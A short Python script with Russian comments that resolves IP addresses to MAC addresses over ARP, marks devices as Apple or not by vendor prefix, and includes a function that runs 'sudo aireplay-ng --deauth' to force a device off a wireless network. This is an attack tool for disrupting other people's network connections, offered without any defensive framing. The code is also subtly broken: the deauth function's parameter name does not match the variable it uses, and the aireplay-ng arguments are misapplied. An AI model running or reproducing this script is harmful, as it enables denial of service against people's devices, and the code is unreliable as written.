from scapy.all import ARP, srp, Ether
import subprocess

# Загрузка MAC-адресов из файла
def load_mac_addresses(file_path):
    with open(file_path, "r", encoding='utf-8') as file:
        return {line.strip() for line in file}

# Проверка, является ли MAC-адрес Apple
def is_apple_device(mac, mac_set):
    # Оставляем только первые три октета MAC-адреса для сравнения
    mac_prefix = mac.strip().upper()[:8]
    return mac_prefix in mac_set

# Получение MAC-адреса по IP и проверка на принадлежность к Apple
def get_mac_address(ip, mac_set, iface="en0"):
    try:
        arp_request = ARP(pdst=ip)
        ether_frame = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether_frame / arp_request

        result = srp(packet, timeout=6, verbose=False, iface=iface)[0]

        if result:
            mac_address = result[0][1].hwsrc

            # Проверяем, является ли MAC-адрес Apple
            if is_apple_device(mac_address, mac_set):
                return f"{mac_address} (apple)"
            else:
                return f"{mac_address} (another)"
        else:
            return None
    except Exception as e:
        print(f"Error retrieving MAC for IP {ip}: {e}")
        return None

# Отправка deauthentication пакетов для отключения устройства от сети
def send_deauth(mac_adress):
    try:
        # Используем aireplay-ng для отправки deauth пакетов
        subprocess.run([
            "sudo", "aireplay-ng", "--deauth", "10", "-a", mac_address, "en0"
        ])
        print(f"Deauthentication packets sent to {mac_address}")
    except Exception as e:
        print(f"Error sending deauth packets: {e}")
